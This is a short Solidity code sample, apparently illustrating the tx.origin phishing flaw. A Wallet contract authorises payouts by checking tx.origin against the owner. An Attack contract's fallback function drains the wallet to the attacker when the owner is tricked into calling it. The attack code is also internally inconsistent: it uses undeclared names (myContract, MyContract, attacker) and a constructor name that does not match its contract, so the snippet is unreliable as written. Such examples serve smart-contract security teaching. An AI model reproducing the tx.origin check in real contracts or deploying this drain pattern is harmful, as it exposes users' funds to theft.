contract Wallet {

   address owner;

   function Wallet() public {
       owner = msg.sender;
   }

   function sendTo(address receiver, uint amount) public {
       require(tx.origin == owner);
       (bool success, ) = receiver.call.value(amount)("");
       require(success);
   }

}

contract Attack {

   Wallet wallet; 
   address attack;

   function AttackingContract(address myContractAddress) public {
       myContract = MyContract(myContractAddress);
       attacker = msg.sender;
   }

   function() public {
       myContract.sendTo(attacker, msg.sender.balance);
   }

}
